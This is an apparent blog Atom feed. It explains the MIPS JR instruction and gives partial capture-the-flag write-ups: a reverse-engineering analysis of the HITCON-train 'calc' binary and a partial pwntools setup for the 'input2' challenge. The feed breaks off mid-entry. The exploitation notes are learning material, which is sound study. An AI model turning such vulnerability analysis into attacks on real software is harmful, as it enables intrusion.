<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wtf</title>
  
  
  <link href="http://im0use.github.io/atom.xml" rel="self"/>
  
  <link href="http://im0use.github.io/"/>
  <updated>2022-05-29T04:42:44.435Z</updated>
  <id>http://im0use.github.io/</id>
  
  <author>
    <name>wtfff</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>mips-jr</title>
    <link href="http://im0use.github.io/2022/06/18/mips_jr/"/>
    <id>http://im0use.github.io/2022/06/18/mips_jr/</id>
    <published>2022-06-18T14:43:16.000Z</published>
    <updated>2022-05-29T04:42:44.435Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><h3 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h3><p>The <em>Jump Register</em> instruction causes the <em>PC</em> to jump to the contents of <em>the first source register</em>.</p><h3 id="syntax"><a href="#syntax" class="headerlink" title="syntax"></a>syntax</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JR $first source register's address</span><br></pre></td></tr></table></figure><p>take a sample: <code>JR $13</code></p><h3 id="binary-expression"><a href="#binary-expression" class="headerlink" title="binary expression"></a>binary expression</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|000000|01101|00000|00000|00000|001000|</span><br><span class="line">(Opcode) (rs)  (rt)  (rd) (shamt)(funct)</span><br></pre></td></tr></table></figure><p>length</p><ul><li>Opcode: 6</li><li>rs: 5</li><li>rt: 5</li><li>rd: 5</li><li>shamt: 5</li><li>funct: 6</li></ul><p>length_all = 6+5+5+5+5+6 = 32</p><p>if we make <code>$13</code> register’s value equals to 789 in decmical, so we can find some information on <code>$13</code></p><table><thead><tr><th>Register’s Address</th><th>Register’s Address  (Binary)</th><th>Register’s Value</th><th>Register’s Value  (Hexadecimal)</th></tr></thead><tbody><tr><td>$13</td><td>01101</td><td>789</td><td>00000315</td></tr></tbody></table><h3 id="procedure"><a href="#procedure" class="headerlink" title="procedure"></a>procedure</h3><ul><li>This simple datapath is of a single-cycle nature. The instruction begins with the PC. PC value set to 00000114H</li><li>The PC’s value, as well as a fixed value necessary to increase the PC by one cycle are passed into the ALU. The address of the instruction to be executed is passed to the IM.</li><li>The Adder performs an arithmetic add operation to determine the next PC  value. On the other hand, the instruction is decoded by the IM.</li><li>IM: Fetching instruction from 00000114H: <code>000000 01101 00000 00000 00000 001000B</code></li><li>Adder: Add 00000004H to 00000114H.</li><li>The decoded instruction is split into different corresponding segments  and sent to the RF. The function bits are sent to the ALU Control, and  the opcode is sent to the Control Unit.</li><li>The RF retrieves the data from the register required by the instruction. The CU identifies the type of instruction it is via the opcode.</li><li>Control Unit: Opcode 000000B, Instruction: R type</li><li>Read $13(01101B)’s value of 000001CDH</li><li>The Adder sends the new PC value to the MUX. The RF sends the read data to the ALU and the MUX.</li><li>new PC: 00000118H=00000004H+00000114H</li><li>JRsel = 1B</li><li>From the JRsel signal sent by the CU, the MUX selects the input from the RF to be the next PC value.</li><li>The MUX sends the new PC value to the PC.</li></ul><img src="\images\mips_jr.png"><h2 id="source-netdoor"><a href="#source-netdoor" class="headerlink" title="source netdoor"></a>source netdoor</h2><p><a href="https://www3.ntu.edu.sg/home/smitha/fyp_gerald/jrInstruction.html">https://www3.ntu.edu.sg/home/smitha/fyp_gerald/jrInstruction.html</a></p><p>This source is very nice and interest. It make the abstract knowledge animated.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;overview&quot;&gt;&lt;a href=&quot;#overview&quot; class=&quot;headerlink&quot; title=&quot;overview&quot;&gt;&lt;/a&gt;overview&lt;/h2&gt;&lt;h3 id=&quot;Instruction&quot;&gt;&lt;a </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HITCON-train-hacknote</title>
    <link href="http://im0use.github.io/2022/06/18/pwnable/"/>
    <id>http://im0use.github.io/2022/06/18/pwnable/</id>
    <published>2022-06-18T14:43:16.000Z</published>
    <updated>2022-05-29T04:23:01.734Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  ssignal(<span class="number">14</span>, timeout);</span><br><span class="line">  alarm(<span class="number">60</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"=== Welcome to SECPROG calculator ==="</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  calc();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Merry Christmas!"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">calc</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> nums[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> expr[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    bzero(expr, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !get_expr(expr, <span class="number">1024</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(nums);</span><br><span class="line">    <span class="keyword">if</span> ( parse_expr((<span class="type">int</span>)expr, nums) )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, nums[nums[<span class="number">0</span>]]);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ canary;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">get_expr</span><span class="params">(<span class="type">int</span> expr, <span class="type">int</span> _1024)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; _1024 &amp;&amp; read(<span class="number">0</span>, &amp;v4, <span class="number">1</span>) != <span class="number">-1</span> &amp;&amp; v4 != <span class="number">10</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="string">'+'</span> || v4 == <span class="string">'-'</span> || v4 == <span class="string">'*'</span> || v4 == <span class="string">'/'</span> || v4 == <span class="string">'%'</span> || v4 &gt; <span class="string">'/'</span> &amp;&amp; v4 &lt;= <span class="string">'9'</span> )</span><br><span class="line">    {</span><br><span class="line">      v2 = v5++;</span><br><span class="line">      *(_BYTE *)(expr + v2) = v4;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  *(_BYTE *)(v5 + expr) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">parse_expr</span><span class="params">(<span class="type">int</span> expr, _DWORD *nums)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax nums[0] 表示数量，nums 保存数字。</span></span><br><span class="line">  <span class="type">int</span> prev_num_temp; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> seqopr; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> num_len; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *prev_nums_str; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> prev_nums; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> operator[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  prev_num_temp = expr;</span><br><span class="line">  seqopr = <span class="number">0</span>;</span><br><span class="line">  bzero(operator, <span class="number">0x64</span>u);                       <span class="comment">// 将 s 清零</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + expr) - <span class="number">48</span>) &gt; <span class="number">9</span> )<span class="comment">// 判断是否为 符号</span></span><br><span class="line">    {<span class="comment">// 如果为符号就继续往下走</span></span><br><span class="line">      num_len = i + expr - prev_num_temp;   </span><br><span class="line">      prev_nums_str = (<span class="type">char</span> *)<span class="built_in">malloc</span>(num_len + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(prev_nums_str, prev_num_temp, num_len);</span><br><span class="line">      prev_nums_str[num_len] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(prev_nums_str, <span class="string">"0"</span>) )<span class="comment">// 符号的左操作数若为0则直接退出，即使不是除法</span></span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"prevent division by zero"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      prev_nums = atoi(prev_nums_str);</span><br><span class="line">      <span class="keyword">if</span> ( prev_nums &gt; <span class="number">0</span> )</span><br><span class="line">      {</span><br><span class="line">        v3 = (*nums)++;  <span class="comment">// *nums表示是已经有几个数字</span></span><br><span class="line">        nums[v3 + <span class="number">1</span>] = prev_nums;               <span class="comment">// nums[[nums]+1] = prev_nums  将数字接着数组存入</span></span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(i + expr) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + <span class="number">1</span> + expr) - <span class="number">48</span>) &gt; <span class="number">9</span> )<span class="comment">// 连续两个符号以上就不行</span></span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      prev_num_temp = i + <span class="number">1</span> + expr;<span class="comment">// 运算符右操作数</span></span><br><span class="line">      <span class="keyword">if</span> ( operator[seqopr] )                   <span class="comment">// operator[seqopr]为上一个运算符，判断上一个操作符是否为0</span></span><br><span class="line">      {                                         <span class="comment">// 若不为0，则当前运算符不为第一个运算符，那么对之前的表达式进行计算。</span></span><br><span class="line">        <span class="keyword">switch</span> ( *(_BYTE *)(i + expr) )         <span class="comment">// 若为0，则当前运算符为第一个运算符，继续取操作数，不计算。</span></span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">            <span class="keyword">if</span> ( operator[seqopr] != <span class="string">'+'</span> &amp;&amp; operator[seqopr] != <span class="string">'-'</span> ) {</span><br><span class="line">              eval(nums, operator[seqopr]);</span><br><span class="line">              operator[seqopr] = *(_BYTE *)(i + expr);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              operator[++seqopr] = *(_BYTE *)(i + expr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(nums, operator[seqopr--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        operator[seqopr] = *(_BYTE *)(i + expr);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + expr) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( seqopr &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(nums, operator[seqopr--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">_DWORD *__cdecl <span class="title function_">init_pool</span><span class="params">(_DWORD *nums)</span></span><br><span class="line">{</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = nums;</span><br><span class="line">  *nums = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    result = nums;</span><br><span class="line">    nums[i + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">_DWORD *__cdecl <span class="title function_">eval</span><span class="params">(_DWORD *a1, <span class="type">char</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="string">'+'</span> )</span><br><span class="line">  {</span><br><span class="line">    a1[*a1 - <span class="number">1</span>] += a1[*a1];</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="string">'+'</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">45</span> )</span><br><span class="line">    {</span><br><span class="line">      a1[*a1 - <span class="number">1</span>] -= a1[*a1];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'/'</span> )</span><br><span class="line">    {</span><br><span class="line">      a1[*a1 - <span class="number">1</span>] /= (<span class="type">int</span>)a1[*a1];</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'*'</span> )</span><br><span class="line">  {</span><br><span class="line">    a1[*a1 - <span class="number">1</span>] *= a1[*a1];</span><br><span class="line">  }</span><br><span class="line">  result = a1;</span><br><span class="line">  --*a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>运行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  calc ./calc </span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">2 + 32</span><br><span class="line">34</span><br><span class="line">4 * 8</span><br><span class="line">32</span><br><span class="line">3 + 0</span><br><span class="line">prevent division by zero</span><br><span class="line">3 + a</span><br><span class="line">expression error!</span><br><span class="line">3 ++</span><br><span class="line">expression error!</span><br><span class="line">k</span><br><span class="line">Merry Christmas!</span><br></pre></td></tr></table></figure><p>借助测试可以发现一些规则，比如输入 0 会发生“prevent division by zero”信息，输入字母也不能计算，只输入字母会直接退出。</p><p>会出现一些干扰利用的东西，我们直接来到 eval ，这个函数承担计算的主要功能。简化一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">long</span> <span class="type">long</span> *initpool, <span class="type">char</span> cur_operator)</span> {</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *eax;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( cur_operator == <span class="string">'+'</span> )</span><br><span class="line">        initpool[*initpool - <span class="number">1</span>] += initpool[*initpool];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( cur_operator == <span class="string">'-'</span> )</span><br><span class="line">        initpool[*initpool - <span class="number">1</span>] -= initpool[*initpool];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( cur_operator == <span class="string">'/'</span> )</span><br><span class="line">        initpool[*initpool - <span class="number">1</span>] /= initpool[*initpool];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( cur_operator == <span class="string">'*'</span> )</span><br><span class="line">        initpool[*initpool - <span class="number">1</span>] *= initpool[*initpool];</span><br><span class="line">    eax = initpool;</span><br><span class="line">    *initpool = *initpool - <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>*initpool 保存当前运算数个数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( operator[prev] ) {                              </span><br><span class="line"><span class="keyword">switch</span> ( *(_BYTE *)(i + expr) ) {</span><br><span class="line"><span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line"><span class="keyword">if</span> ( operator[prev] != <span class="string">'+'</span> &amp;&amp; operator[prev] != <span class="string">'-'</span> ) {</span><br><span class="line">eval(nums, operator[prev]);</span><br><span class="line">operator[prev] = *(_BYTE *)(i + expr);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">operator[++prev] = *(_BYTE *)(i + expr);<span class="comment">//8*9+2</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">eval(nums, operator[prev--]);<span class="comment">// loc_80491E3 &lt;parse_expr + 441&gt;</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    operator[seqopr] = *(_BYTE *)(i + expr);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>假如当前运算符为+或-，读到上面第 16 行的 eval 需要满足什么条件？<code>(unsigned int)(*(char *)(i + expr) - 48) &gt; 9 &amp;&amp; strcmp(prev_nums_str, "0") &amp;&amp; ( *(_BYTE *)(i + expr) &amp;&amp; (unsigned int)(*(char *)(i + 1 + expr) - 48) &gt; 9 ) &amp;&amp; operator[prev] &amp;&amp; ( *(_BYTE *)(i + expr) == '+' || *(_BYTE *)(i + expr) == '-')</code></p><ul><li>现在指针（i + expr）指向的是运算符。</li><li>指针前面的数字（prev_nums_str）不能是 0，因为这里是 memcpy 复制过来的数字所以是字符串不能为 “0”。</li><li>指针的下一位（i + 1 + expr）不能是运算符，即两个运算符不能挨在一起。</li><li>operator 里存放有运算符</li><li>现在指针所指向运算符为 + 或者 -</li></ul><p>然后应该是运算上一个数和上上一个数的运算公式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+————————————————————————————+————————————————+</span><br><span class="line">|           191910|op|     114514     |</span><br><span class="line">+————————————————————————————+————————————————+</span><br><span class="line">   ^  ^</span><br><span class="line">   |  |</span><br><span class="line">     prev_num_tempi + expr = '+' or '-'</span><br></pre></td></tr></table></figure><p>如果是第一次遇到运算符，如何处理？</p><ul><li>如果是 “%*/“ 中的一个运算符且前一个运算符也是，<code>eval(initpool, operator[prev]); operator[prev] = *(_BYTE *)(i + expr);</code>，可以看见这种运算符用完就丢掉。</li><li></li></ul><p>breakpoint：</p><ul><li>0x8049130：<code>prev_nums = atoi(prev_nums_str);</code></li><li>0x8049354：<code>while ( prev &gt;= 0 ) eval(initpool, operator[prev--]);</code></li><li>0x804928A：<code>operator[++prev] = *(_BYTE *)(i + expr);</code>现”%*/“，上一位”+-“</li><li>0x804922C：<code>eval(nums, operator[prev]);</code>连续非+-号</li><li>0x804922A：default</li><li>0x80491E3：<code>operator[seqopr] = *(_BYTE *)(i + expr);</code>存符号</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;calc&quot;&gt;&lt;a href=&quot;#calc&quot; class=&quot;headerlink&quot; title=&quot;calc&quot;&gt;&lt;/a&gt;calc&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>input2</title>
    <link href="http://im0use.github.io/2022/06/10/input2/"/>
    <id>http://im0use.github.io/2022/06/10/input2/</id>
    <published>2022-06-10T14:43:16.000Z</published>
    <updated>2022-05-29T00:58:53.984Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="Stage-1-clear"><a href="#Stage-1-clear" class="headerlink" title="Stage 1 clear!"></a>Stage 1 clear!</h2><p>Firstly, there has argv. It sames like that behind.</p><p>such as <code>/bin/ls -l</code>: left one represent argv[0], right one represent argv[1], …etc. argc represent the length of argv list.</p><p>So in order to satisfy <code>strcmp(argv['A'],"\x00") != 0</code>, I can set <code>argv['A'] = "\x00"</code>, and next condition.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">argv =  [<span class="string">'./input'</span>]</span><br><span class="line">argv += [<span class="string">'f'</span>] * (<span class="built_in">ord</span>(<span class="string">'A'</span>) - <span class="number">1</span>)</span><br><span class="line">argv += [<span class="string">'\x00'</span>]<span class="comment"># strcmp(argv['A'],"\x00") == 0</span></span><br><span class="line">argv += [<span class="string">'\x20\x0a\x0d'</span>]<span class="comment"># strcmp(argv['B'],"\x20\x0a\x0d") == 0</span></span><br><span class="line">argv += [<span class="string">'f'</span>] * (<span class="number">100</span> - <span class="built_in">len</span>(argv)) <span class="comment"># argc = 100</span></span><br></pre></td></tr></table></figure><h2 id="Stage-2-clear"><a href="#Stage-2-clear" class="headerlink" title="Stage 2 clear!"></a>Stage 2 clear!</h2><p>stdio: standard input/output</p><p>It uses the <code>read</code>.</p><ul><li>read - read from a file descriptor</li><li>include: unistd.h</li><li><code>ssize_t read(int fd, void *buf, size_t count);</code></li></ul><table><thead><tr><th>整数值</th><th>名称</th><th>unistd.h符号常量</th><th>stdio.h文件流</th></tr></thead><tbody><tr><td>0</td><td>Standard input</td><td>STDIN_FILENO</td><td>stdin</td></tr><tr><td>1</td><td>Standard output</td><td>STDOUT_FILENO</td><td>stdout</td></tr><tr><td>2</td><td>Standard error</td><td>STDERR_FILENO</td><td>stderr</td></tr></tbody></table><ul><li><code>read(0, buf, 4);</code>: read 4 bytes from stdin</li><li><code>read(2, buf, 4);</code>: read 2 bytes from stderr</li></ul><p>We can easily use pwntools to start our play. This tool we need called process.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process() - Spawns a new process, and wraps it with a tube for communication.</span><br></pre></td></tr></table></figure><p>We can create program.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line">p = process(argv, stderr=stderr_we_want)</span><br></pre></td></tr></table></figure><p>Cation! <code>stderr_we_want="\x00\x0a\x02\xff"</code> can’t work well. stderr is a file descriptor. <code>open</code> return file descriptor, we can hand it.</p><h2 